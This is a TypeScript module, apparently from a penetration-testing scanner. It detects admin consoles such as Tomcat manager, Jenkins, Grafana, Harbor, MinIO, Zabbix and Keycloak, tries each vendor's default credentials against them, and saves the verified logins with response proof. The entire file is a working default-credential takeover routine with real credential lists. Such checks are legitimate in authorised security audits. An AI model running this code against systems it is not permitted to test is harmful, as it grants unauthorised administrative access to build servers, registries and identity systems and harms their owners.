import { fetchUrl, type FetchResult } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** Admin console default-credential takeover: fingerprint a panel, then try
 *  the vendor's shipped default credential pairs and verify with a marker
 *  request (never trust a bare 200 — login pages answer 200 too). Covers the
 *  panels that ship (or are overwhelmingly deployed with) well-known defaults:
 *  Tomcat manager, Jenkins, Grafana, SonarQube, Harbor, RabbitMQ, Nacos,
 *  MinIO, Zabbix, Keycloak. */

type AuthKind = "basic" | "json" | "query" | "form";

interface Cred {
  readonly user: string;
  readonly pass: string;
}

interface Panel {
  readonly id: string;
  /** Path used to detect the panel; any status is fine, marker decides. */
  readonly detectPath: string;
  readonly marker: RegExp;
  /** Optional pre-check request (method/body) — defaults to GET detectPath. */
  readonly probe?: { readonly method: string; readonly body: string; readonly contentType: string };
  readonly kind: AuthKind;
  readonly creds: readonly Cred[];
  /** Verify request after credentials are supplied. */
  readonly verify: { readonly path: string; readonly method: string; readonly body?: string; readonly contentType?: string; readonly okMarker: RegExp };
}

const PANELS: readonly Panel[] = [
  {
    id: "tomcat-manager", detectPath: "/manager/html",
    marker: /Tomcat Web Application Manager|Tomcat Manager|WWW-Authenticate:.*Tomcat/i,
    kind: "basic",
    creds: [{ user: "tomcat", pass: "tomcat" }, { user: "tomcat", pass: "s3cret" }, { user: "admin", pass: "admin" }, { user: "both", pass: "both" }, { user: "manager", pass: "manager" }],
    verify: { path: "/manager/html", method: "GET", okMarker: /Tomcat Web Application Manager|OK - Number of results/ },
  },
  {
    id: "jenkins", detectPath: "/login",
    marker: /Jenkins|jenkins/i,
    kind: "basic",
    creds: [{ user: "admin", pass: "admin" }, { user: "jenkins", pass: "jenkins" }, { user: "admin", pass: "password" }, { user: "admin", pass: "jenkins" }],
    verify: { path: "/api/json", method: "GET", okMarker: /"jobs"|"mode"|"nodeName"/ },
  },
  {
    id: "grafana", detectPath: "/login",
    marker: /Grafana|grafana/i,
    kind: "json",
    creds: [{ user: "admin", pass: "admin" }, { user: "admin", pass: "grafana" }, { user: "admin", pass: "prom-operator" }],
    verify: { path: "/api/user", method: "GET", okMarker: /"login"|"isGrafanaAdmin"/ },
  },
  {
    id: "sonarqube", detectPath: "/api/system/status",
    marker: /"status"\s*:\s*"(UP|STARTING|DOWN)"/,
    kind: "basic",
    creds: [{ user: "admin", pass: "admin" }],
    verify: { path: "/api/authentication/validate", method: "GET", okMarker: /"valid"\s*:\s*true/ },
  },
  {
    id: "harbor", detectPath: "/api/v2.0/systeminfo",
    marker: /"harbor_version"|"registry_url"/,
    kind: "basic",
    creds: [{ user: "admin", pass: "Harbor12345" }],
    verify: { path: "/api/v2.0/users/current", method: "GET", okMarker: /"username"\s*:\s*"admin"/ },
  },
  {
    id: "rabbitmq", detectPath: "/api/overview",
    marker: /RabbitMQ Management|"rabbitmq_version"/,
    kind: "basic",
    creds: [{ user: "guest", pass: "guest" }, { user: "admin", pass: "admin" }],
    verify: { path: "/api/overview", method: "GET", okMarker: /"rabbitmq_version"/ },
  },
  {
    id: "nacos", detectPath: "/nacos/",
    marker: /nacos|Nacos/i,
    kind: "form",
    creds: [{ user: "nacos", pass: "nacos" }],
    verify: { path: "/nacos/v1/auth/users/login", method: "POST", contentType: "application/x-www-form-urlencoded", okMarker: /"accessToken"|"token"/ },
  },
  {
    id: "minio", detectPath: "/minio/health/live",
    marker: /./,
    kind: "json",
    creds: [{ user: "minioadmin", pass: "minioadmin" }],
    verify: { path: "/api/v1/login", method: "POST", contentType: "application/json", okMarker: /"token"|"accessToken"/ },
  },
  {
    id: "zabbix", detectPath: "/api_jsonrpc.php",
    marker: /"jsonrpc"|Zabbix/i,
    probe: { method: "POST", contentType: "application/json", body: '{"jsonrpc":"2.0","method":"apiinfo.version","params":{},"id":1}' },
    kind: "json",
    creds: [{ user: "Admin", pass: "zabbix" }],
    verify: { path: "/api_jsonrpc.php", method: "POST", contentType: "application/json", okMarker: /"result"\s*:\s*"[0-9a-f]{16,}"/ },
  },
  {
    id: "keycloak", detectPath: "/realms/master/.well-known/openid-configuration",
    marker: /"issuer".*realms\/master/,
    kind: "form",
    creds: [{ user: "admin", pass: "admin" }],
    verify: { path: "/realms/master/protocol/openid-connect/token", method: "POST", contentType: "application/x-www-form-urlencoded", okMarker: /"access_token"/ },
  },
];

export interface AdminCredsInput {
  readonly baseUrl: string;
  readonly outputRoot: string;
  readonly cookie?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  /** Restrict to these panel ids (default: all). */
  readonly panels?: readonly string[];
}

export interface AdminCredsHit {
  readonly panel: string;
  readonly username: string;
  readonly password: string;
  readonly verifiedBy: string;
  readonly proof: string;
}

export interface AdminCredsDetected {
  readonly panel: string;
  readonly path: string;
  readonly status: number;
}

export interface AdminCredsResult {
  readonly detected: AdminCredsDetected[];
  readonly hits: AdminCredsHit[];
  readonly tried: number;
  readonly artifacts: { path: string; bytes: number }[];
}

const authHeader = (user: string, pass: string): string => `Basic ${Buffer.from(`${user}:${pass}`).toString("base64")}`;

const call = async (
  base: string, panel: Panel, path: string, method: string, extra: { readonly headers?: Record<string, string>; readonly body?: string; readonly contentType?: string },
  opts: AdminCredsInput,
): Promise<FetchResult> => {
  const headers: Record<string, string> = { ...(opts.headers ?? {}) };
  if (extra.contentType) headers["content-type"] = extra.contentType;
  if (extra.headers) Object.assign(headers, extra.headers);
  return fetchUrl(new URL(path, base).href, {
    method, headers: headers as Record<string, string>, body: extra.body,
    maxAttempts: 1, redirect: "manual", proxy: opts.proxy, timeoutMs: opts.timeoutMs ?? 10_000,
    cookie: opts.cookie, maxBytes: 256 * 1024,
  });
};

const detect = async (base: string, panel: Panel, opts: AdminCredsInput): Promise<boolean> => {
  const res = panel.probe
    ? await call(base, panel, panel.detectPath, panel.probe.method, { body: panel.probe.body, contentType: panel.probe.contentType }, opts)
    : await call(base, panel, panel.detectPath, "GET", {}, opts);
  if (res.status === 0) return false;
  // Match marker against body or auth challenge realm; a hard 404 is never a panel.
  const haystack = `${res.body}\n${res.headers["www-authenticate"] ?? ""}`;
  if (res.status === 404) return false;
  return panel.marker.test(haystack) || (panel.id === "minio" && res.status === 200);
};

const formBody = (fields: Record<string, string>): string => new URLSearchParams(fields).toString();

const tryPanel = async (base: string, panel: Panel, opts: AdminCredsInput): Promise<AdminCredsHit | null> => {
  for (const cred of panel.creds) {
    let res: FetchResult;
    if (panel.kind === "basic") {
      res = await call(base, panel, panel.verify.path, panel.verify.method, { headers: { authorization: authHeader(cred.user, cred.pass) } }, opts);
    } else if (panel.kind === "form") {
      const isNacos = panel.id === "nacos";
      const body = formBody(isNacos ? { username: cred.user, password: cred.pass } : { username: cred.user, password: cred.pass, grant_type: "password", client_id: "admin-cli" });
      res = await call(base, panel, panel.verify.path, "POST", { body, contentType: panel.verify.contentType ?? "application/x-www-form-urlencoded" }, opts);
    } else {
      const isMinio = panel.id === "minio";
      const isZabbix = panel.id === "zabbix";
      const body = isMinio
        ? JSON.stringify({ accessKey: cred.user, secretKey: cred.pass })
        : isZabbix
          ? JSON.stringify({ jsonrpc: "2.0", method: "user.login", params: { username: cred.user, password: cred.pass }, id: 2 })
          : JSON.stringify({ user: cred.user, password: cred.pass });
      res = await call(base, panel, panel.verify.path, "POST", { body, contentType: panel.verify.contentType ?? "application/json" }, opts);
    }
    if (res.status >= 200 && res.status < 300 && panel.verify.okMarker.test(res.body)) {
      return { panel: panel.id, username: cred.user, password: cred.pass, verifiedBy: `${panel.verify.method} ${res.status}`, proof: res.body.slice(0, 240) };
    }
  }
  return null;
};

export const probeAdminCreds = async (input: AdminCredsInput): Promise<AdminCredsResult> => {
  const base = new URL(input.baseUrl).href;
  const wanted = input.panels?.length ? PANELS.filter((p) => input.panels!.includes(p.id)) : PANELS;
  const detected: AdminCredsDetected[] = [];
  // Detect in parallel (independent reads), then credential attempts serially
  // per panel (each success short-circuits the panel's own list).
  const flags = await Promise.all(wanted.map(async (p) => ((await detect(base, p, input)) ? p : null)));
  const live = flags.filter((p): p is Panel => p !== null);
  for (const p of live) {
    const res = await call(base, p, p.detectPath, "GET", {}, input);
    detected.push({ panel: p.id, path: p.detectPath, status: res.status });
  }
  const hits: AdminCredsHit[] = [];
  let tried = 0;
  for (const p of live) {
    tried += p.creds.length;
    const hit = await tryPanel(base, p, input);
    if (hit) hits.push(hit);
  }
  const body = JSON.stringify({ baseUrl: base, detected, hits, tried }, null, 2);
  const artifact = await writeArtifact(input.outputRoot, "admin_creds.json", body);
  return { detected, hits, tried, artifacts: [artifact] };
};
